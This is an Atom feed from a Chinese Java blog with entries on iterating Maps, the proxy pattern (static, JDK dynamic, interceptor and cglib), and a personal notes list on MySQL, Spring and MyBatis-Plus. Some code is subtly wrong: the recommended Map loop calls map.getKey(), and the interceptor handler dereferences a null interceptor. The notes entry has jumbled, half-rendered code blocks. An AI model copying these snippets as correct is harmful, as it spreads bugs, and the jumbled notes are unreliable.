<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Kayleh</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://kayleh.top/"/>
  <updated>2021-05-12T15:51:22.995Z</updated>
  <id>https://kayleh.top/</id>
  
  <author>
    <name>Kayleh</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Improve Robustness (1)</title>
    <link href="https://kayleh.top/improve-robustness-(1)/"/>
    <id>https://kayleh.top/improve-robustness-(1)/</id>
    <published>2021-05-12T07:44:09.000Z</published>
    <updated>2021-05-12T15:51:22.995Z</updated>
    
    <content type="html"><![CDATA[<h1 id="提高代码鲁棒性——（1）"><a href="#提高代码鲁棒性——（1）" class="headerlink" title="提高代码鲁棒性——（1）"></a>提高代码鲁棒性——（1）</h1><ul><li>需要 Map 的主键和取值时，应该迭代 entrySet()</li></ul><p>当循环中只需要 Map 的主键时，迭代 keySet() 是正确的。但是，当需要主键和取值时，迭代 entrySet() 才是更高效的做法，比先迭代 keySet() 后再去 get 取值性能更佳。</p><p>反例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String,String&gt; map = <span class="keyword">new</span> HashMap();</span><br><span class="line"><span class="keyword">for</span>(String key : map.keySet())</span><br><span class="line">&#123;</span><br><span class="line">    String value = map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String,String&gt; map = <span class="keyword">new</span> HashMap();</span><br><span class="line"><span class="keyword">for</span>(Map.Entry&lt;String,String&gt; entry:map.entrySet())</span><br><span class="line">&#123;</span><br><span class="line">    String key = map.getKey();</span><br><span class="line">    String value = entry.getValue();</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>不要让常量变成变量</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;提高代码鲁棒性——（1）&quot;&gt;&lt;a href=&quot;#提高代码鲁棒性——（1）&quot; class=&quot;headerlink&quot; title=&quot;提高代码鲁棒性——（1）&quot;&gt;&lt;/a&gt;提高代码鲁棒性——（1）&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;需要 Map 的主键和取值时，应该迭代 entr
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Proxy</title>
    <link href="https://kayleh.top/proxy/"/>
    <id>https://kayleh.top/proxy/</id>
    <published>2021-04-25T05:37:43.000Z</published>
    <updated>2021-04-25T13:44:45.051Z</updated>
    
    <content type="html"><![CDATA[<p>代理模式是一种经典的设计模式，代理的意义在于生成代理对象，在服务提供方和使用方之间充当一个媒介，控制真实对象的访问。</p><p>代理分为静态代理和动态代理两种。</p><p>静态代理需要通过手动或工具生成代理类并编译，代理类和委托类的关系在编译期就已经确定。动态代理允许开发人员在运行时动态的创建出代理类及其对象。</p><p>Spring AOP 的主要技术基础就是 Java 的动态代理机制。</p><h3 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h3><p>静态代理的实现需要一个接口(表示要完成的功能)，一个真实对象和一个代理对象(两者都需实现这个接口)。</p><p>示例如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Shopping</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">buy</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Client</span> <span class="keyword">implements</span> <span class="title">Shopping</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">buy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"我想买这件商品"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StaticProxy</span> <span class="keyword">implements</span> <span class="title">Shopping</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Shopping shopping;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">StaticProxy</span><span class="params">(Shopping shopping)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.shopping = shopping;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">buy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"降价促销，疯狂大甩卖了！"</span>);</span><br><span class="line">        shopping.buy();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StaticProxyTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Client client = <span class="keyword">new</span> Client();</span><br><span class="line">        StaticProxy service = <span class="keyword">new</span> StaticProxy(client);</span><br><span class="line">        service.buy();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">-----------------------------------------</span><br><span class="line">输出结果：</span><br><span class="line">降价促销，疯狂大甩卖了！</span><br><span class="line">我想买这件商品</span><br></pre></td></tr></table></figure><h3 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h3><p>动态代理可以让我们在运行时动态生成代理类，解耦程度更高。Java 动态代理的实现主要借助于 java.lang.reflect 包中的 Proxy 类与 InvocationHandler 接口，所有对动态代理对象的方法调用都会转发到 InvocationHandler 中的 invoke() 方法中实现。一般我们称实现了 InvocationHandler 接口的类为调用处理器。</p><p>我们可以通过 Proxy 的静态工厂方法 newProxyInstance 创建动态代理类实例。</p><p>方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">newProxyInstance</span><span class="params">(ClassLoader loader,</span></span></span><br><span class="line"><span class="function"><span class="params">                                          Class&lt;?&gt;[] interfaces,</span></span></span><br><span class="line"><span class="function"><span class="params">                                          InvocationHandler h)</span></span></span><br></pre></td></tr></table></figure><blockquote><p>loader：类加载器<br>interfaces：类实现的全部接口<br>h：调用处理器</p></blockquote><p>示例如下：</p><pre><code>public class DynamicProxy implements InvocationHandler {    private Object target = null;    DynamicProxy(Object target) {        this.target = target;    }    /**     * 代理方法逻辑     *     * @param proxy  代理对象     * @param method 调度方法     * @param args   调度方法参数     */    @Override    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {        System.out.println(&quot;代理前&quot;);        method.invoke(target, args);        System.out.println(&quot;代理后&quot;);        return null;    }}</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DyProxyTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Shopping client = <span class="keyword">new</span> Client();</span><br><span class="line">        DynamicProxy dyProxy = <span class="keyword">new</span> DynamicProxy(client);</span><br><span class="line">        Shopping shop = (Shopping) Proxy.newProxyInstance(Shopping.class.getClassLoader(), new Class[]&#123;Shopping.class&#125;, dyProxy);</span><br><span class="line">        shop.buy();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">代理前</span><br><span class="line">我想买这件商品</span><br><span class="line">代理后</span><br></pre></td></tr></table></figure><p>当然我们也可以将 Proxy.newProxyInstance 方法放到调用处理器中，使客户端编程更为简单。</p><p>示例如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DynamicProxy</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Object target = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    DynamicProxy() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DynamicProxy(Object target) &#123;</span><br><span class="line">        <span class="keyword">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">bind</span><span class="params">(Object target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.target = target;</span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(target.getClass().getClassLoader(), target.getClass().getInterfaces(), <span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 代理方法逻辑</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> proxy  代理对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> method 调度方法</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> args   调度方法参数</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"代理前"</span>);</span><br><span class="line">        method.invoke(target, args);</span><br><span class="line">        System.out.println(<span class="string">"代理后"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DyProxyTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Shopping client = <span class="keyword">new</span> Client();</span><br><span class="line">        DynamicProxy dyProxy = <span class="keyword">new</span> DynamicProxy();</span><br><span class="line">        Shopping shop = (Shopping) dyProxy.bind(client);</span><br><span class="line">        shop.buy();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="拦截器"><a href="#拦截器" class="headerlink" title="拦截器"></a>拦截器</h3><p>拦截器主要就是靠动态代理实现，它可以简化动态代理的使用，我们只需要知道拦截器接口的使用方法即可，无须知道动态代理的实现细节。</p><p>示例如下：</p><pre><code>public interface Interceptor {    public boolean before(Object proxy, Object target, Method method, Object[] args);    public void around(Object proxy, Object target, Method method, Object[] args);    public void after(Object proxy, Object target, Method method, Object[] args);}public class MyInterceptor implements Interceptor {    @Override    public boolean before(Object proxy, Object target, Method method, Object[] args) {        System.out.println(&quot;before&quot;);        return false;    }    @Override    public void around(Object proxy, Object target, Method method, Object[] args) {        System.out.println(&quot;around&quot;);    }    @Override    public void after(Object proxy, Object target, Method method, Object[] args) {        System.out.println(&quot;after&quot;);    }}</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InterceptorProxy</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Object target = <span class="keyword">null</span>;</span><br><span class="line">    Interceptor interceptor = <span class="keyword">null</span>;</span><br><span class="line">    </span><br><span class="line">    InterceptorProxy(Interceptor interceptor) &#123;</span><br><span class="line">        <span class="keyword">this</span>.interceptor = interceptor;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">bind</span><span class="params">(Object target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.target = target;</span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(target.getClass().getClassLoader(), target.getClass().getInterfaces(), <span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 代理方法逻辑</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> proxy  代理对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> method 调度方法</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> args   调度方法参数</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (interceptor == <span class="keyword">null</span>) &#123;</span><br><span class="line">            method.invoke(target, args);</span><br><span class="line">        &#125;</span><br><span class="line">        Object result = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (interceptor.before(proxy, target, method, args)) &#123;</span><br><span class="line">            result = method.invoke(target, args);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            interceptor.around(proxy, target, method, args);</span><br><span class="line">        &#125;</span><br><span class="line">        interceptor.after(proxy, target, method, args);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>输出结果：</p><p>before<br>around<br>after</p></blockquote><p>开发者只需要知道拦截器的作用，设置拦截器，因而相对简单一些。</p><p>拦截器在 Spring AOP 与 Spring MVC 中都有应用。在 Spring AOP 中，</p><ul><li>针对接口做代理默认使用的是 JDK 自带的 Proxy+InvocationHandler</li><li>针对类做代理使用的是 Cglib</li></ul><p>在 Spring MVC中， 主要通过 HandlerInterceptor 接口实现拦截器的功能。</p><p>HandlerInterceptor 接口中包含3个方法：</p><ul><li>preHandle：执行 controller 处理之前执行，返回值为true时接着执行 postHandle 和 afterCompletion，返回false则中断执行</li><li>postHandle：在执行 controller 后，ModelAndView 处理前执行</li><li>afterCompletion ：在执行完 ModelAndView 之后执行<br>此外，Spring MVC 提供了抽象类 HandlerInterceptorAdapter，实现了 HandlerInterceptor 接口。</li></ul><h3 id="cglib"><a href="#cglib" class="headerlink" title="cglib"></a>cglib</h3><p>因为 Java 自带的动态代理工具必须要有一个接口，cglib 不需要接口，只需要一个非抽象类就能实现动态代理。</p><p>示例如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClientProxy</span> <span class="keyword">implements</span> <span class="title">MethodInterceptor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">intercept</span><span class="params">(Object proxy, Method method, Object[] args, MethodProxy methodProxy)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"before"</span>);</span><br><span class="line">        Object obj = methodProxy.invokeSuper(proxy, args);</span><br><span class="line">        System.out.println(<span class="string">"after"</span>);</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CglibTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ClientProxy clientProxy = <span class="keyword">new</span> ClientProxy();</span><br><span class="line">        Enhancer enhancer = <span class="keyword">new</span> Enhancer();</span><br><span class="line">        enhancer.setSuperclass(Client<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        enhancer.setCallback(clientProxy);</span><br><span class="line">        Client client = (Client) enhancer.create();</span><br><span class="line">        client.buy();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>输出结果：</p><p>before<br>我想买这件商品<br>after</p></blockquote><p>————————————————<br>版权声明：本文为CSDN博主「情谊风月」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/weixin_43320847/article/details/82938754" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43320847/article/details/82938754</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;代理模式是一种经典的设计模式，代理的意义在于生成代理对象，在服务提供方和使用方之间充当一个媒介，控制真实对象的访问。&lt;/p&gt;
&lt;p&gt;代理分为静态代理和动态代理两种。&lt;/p&gt;
&lt;p&gt;静态代理需要通过手动或工具生成代理类并编译，代理类和委托类的关系在编译期就已经确定。动态代理允
      
    
    </summary>
    
    
    
      <category term="java" scheme="https://kayleh.top/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>todoList</title>
    <link href="https://kayleh.top/note/"/>
    <id>https://kayleh.top/note/</id>
    <published>2021-04-23T07:53:25.000Z</published>
    <updated>2021-05-20T02:25:51.973Z</updated>
    
    <content type="html"><![CDATA[<h4 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h4><h4 id="TodoList"><a href="#TodoList" class="headerlink" title="TodoList"></a>TodoList</h4><ul><li><a href="https://www.cnblogs.com/lenve/p/11242055.html" target="_blank" rel="noopener">https://www.cnblogs.com/lenve/p/11242055.html</a></li></ul><p><strong>数据库</strong></p><ul><li><p>数据库查询不能整表查询，应创建实体类接收返回给前端</p></li><li><p>bit类型数据是 int类型(1&amp;0)</p></li><li><p>SQLException：TimeZone</p><ul><li><p>解决方式:在连接数据库的url后加上serverTimezone=UTC，完整的url为:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=jdbc:mysql://localhost:3306/spring_cache?useUnicode=true&amp;characterEncoding=UTF8&amp;serverTimezone=UTC</span><br></pre></td></tr></table></figure></li></ul></li><li><p>mysqldump 设置字符集</p><ul><li><p>```cmd<br>mysqldump -u root -p —default-character-set=utf8mb4 dev &gt; D:/dev.sql</p><hr><p>alter table <code>table_name</code> convert to character set utf8mb4;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- mybatis-plus：SQL脚本固定字段</span><br><span class="line"></span><br><span class="line">  &#96;&#96;&#96;mysql</span><br><span class="line">  CREATE TABLE &#96;table&#96; (</span><br><span class="line">    &#96;_id&#96; bigint(20) NOT NULL AUTO_INCREMENT COMMENT &#39;??定义表&#39;,</span><br><span class="line">    &#96;id&#96; varchar(50) NOT NULL DEFAULT &#39;&#39; COMMENT &#39;主键Id&#39;,</span><br><span class="line">    &#96;deleted&#96; bit(1) NOT NULL DEFAULT b&#39;0&#39; COMMENT &#39;是否删除&#39;,</span><br><span class="line">    &#96;version&#96; int(11) NOT NULL DEFAULT &#39;0&#39; COMMENT &#39;乐观锁&#39;,</span><br><span class="line">    &#96;create_userid&#96; varchar(255) NOT NULL DEFAULT &#39;&#39; COMMENT &#39;创建用户Id&#39;,</span><br><span class="line">    &#96;create_username&#96; varchar(255) NOT NULL DEFAULT &#39;&#39; COMMENT &#39;创建用户名称&#39;,</span><br><span class="line">    &#96;create_time&#96; timestamp(3) NOT NULL DEFAULT CURRENT_TIMESTAMP(3) COMMENT &#39;创建时间&#39;,</span><br><span class="line">    &#96;update_userid&#96; varchar(255) NOT NULL DEFAULT &#39;&#39; COMMENT &#39;更新用户Id&#39;,</span><br><span class="line">    &#96;update_username&#96; varchar(255) NOT NULL DEFAULT &#39;&#39; COMMENT &#39;更新用户名称&#39;,</span><br><span class="line">    &#96;update_time&#96; timestamp(3) NOT NULL DEFAULT CURRENT_TIMESTAMP(3) ON UPDATE CURRENT_TIMESTAMP(3) COMMENT &#39;更新时间&#39;,</span><br><span class="line">    PRIMARY KEY (&#96;_id&#96;)</span><br><span class="line">  ) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8mb4 COMMENT&#x3D;&#39;??定义表&#39;;</span><br></pre></td></tr></table></figure></li></ul></li></ul><p><strong>小程序、前端</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">module.exports &#x3D; &#123;&#125;  </span><br><span class="line">  &#x2F;&#x2F;暴露？全局变量？</span><br></pre></td></tr></table></figure> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">query</span><br><span class="line">  -query是传参数用的。</span><br><span class="line">  -上个页面或者那个页面跳转传过来的</span><br><span class="line">  -小程序打开的地址链接是可以带请求参数的，跟url的很类似，例如：sdfasdf?abc=<span class="number">123</span>&amp;bcd=<span class="number">234</span>&amp;cde=<span class="number">345</span>。</span><br><span class="line">  这个意思是在小程序启动时获取mpid并向全局变量里进行赋值</span><br></pre></td></tr></table></figure><p><strong>网络</strong></p><ul><li><p>ResponseEntity</p><p>1.ResponseEntity的优先级高于@ResponseBody。在不是ResponseEntity的情况下才去检查有没有@ResponseBody注解。如果响应类型是ResponseEntity可以不写@ResponseBody注解，写了也没有关系。<br>2.ResponseEntity 是在 org.springframework.http.HttpEntity 的基础上添加了http status code(http状态码)，用于RestTemplate以及@Controller的HandlerMethod。它在Controoler中或者用于服务端响应时，作用是和@ResponseStatus与@ResponseBody结合起来的功能一样的。用于RestTemplate时，它是接收服务端返回的http status code 和 reason的。<br>3.总结： 简单粗暴的讲 @ResponseBody可以直接返回Json结果， @ResponseEntity不仅可以返回json结果，还可以定义返回的HttpHeaders和HttpStatus </p></li></ul><p><strong>框架</strong></p><ul><li><p>@EqualsAndHashCode(callSuper = true)<br>//lombok的一个方法</p></li><li><p>@EnableScheduling</p></li><li><p>spring security（JWT、OAUTH2、）鉴权</p><p><a href="https://kayleh.top/head-first-security">https://kayleh.top/head-first-security</a></p></li><li><p>mybatis-plus</p></li></ul><blockquote><p><a href="https://mp.baomidou.com/guide/" target="_blank" rel="noopener">https://mp.baomidou.com/guide/</a></p></blockquote><ul><li><h5 id="Field-baseMapper-in-com-xxx-required-a-single-bean-but-100-were-found-————Mybatis-Plus"><a href="#Field-baseMapper-in-com-xxx-required-a-single-bean-but-100-were-found-————Mybatis-Plus" class="headerlink" title="Field baseMapper in com.xxx required a single bean,but 100 were found ————Mybatis-Plus"></a>Field baseMapper in com.xxx required a single bean,but 100 were found ————Mybatis-Plus</h5></li></ul><p>报错发生时间：项目启动时。</p><p>报错英文描述：Field baseMapper in com.xxx required a single bean,but 100 were found</p><p>报错信息中文描述：文件baseMapper只需要一个bean服务，但是到了多个，所以它不知道选哪个<br>解决：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">情况一：你的这个类其实不需要操作到数据库，所以这个时候直接把继承IService给去掉就好。</span><br><span class="line"></span><br><span class="line">情况二：你的这个类需要操作到数据库，那么就把相应的泛型给加上，这样它就知道你到底要找的是哪个mapper。</span><br></pre></td></tr></table></figure><p><strong>基础</strong></p><ul><li><p>生成随机字符串入库时，最好不要用UUID.因为UUID生成的字符串中有字母，在业务中，使用到带字母和数字组合的字符串不常用，最好使用</p><ul><li>```java<br>math.random()范围是[0.0, 1.0)，那么math.random()<em>9+1一定是小于10的，(Math.random()</em>9+1)<em>100000一定是&lt;10</em>100000=1000000的一个数<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - </span><br><span class="line"></span><br><span class="line">- 判空(null &#x3D;&#x3D; ?)</span><br><span class="line">- 序列化版本号？</span><br><span class="line"></span><br><span class="line">- 拼接字符串</span><br><span class="line"></span><br><span class="line">  &#96;&#96;&#96;java</span><br><span class="line">  String.join(&quot;,&quot;, List);</span><br></pre></td></tr></table></figure></li></ul></li><li><p>getConstructor和getDeclaredConstructor</p><p>Class类的getConstructor()方法,无论是否设置setAccessible(),都不可获取到类的私有构造器.<br>Class类的getDeclaredConstructor()方法,可获取到类的私有构造器(包括带有其他修饰符的构造器），但在使用private的构造器时，必须设置setAccessible()为true,才可以获取并操作该Constructor对象。</p></li></ul><p><strong>多线程</strong></p><ul><li>wait()的作用是让当前线程进入等待状态，同时，wait()也会让当前线程释放它所持有的锁。“直到其他线程调用此对象的 notify() 方法或 notifyAll() 方法”，当前线程被唤醒(进入“就绪状态”)</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;笔记&quot;&gt;&lt;a href=&quot;#笔记&quot; class=&quot;headerlink&quot; title=&quot;笔记&quot;&gt;&lt;/a&gt;笔记&lt;/h4&gt;&lt;h4 id=&quot;TodoList&quot;&gt;&lt;a href=&quot;#TodoList&quot; class=&quot;headerlink&quot; title=&quot;TodoList&quot;
      
    
    </summary>
    
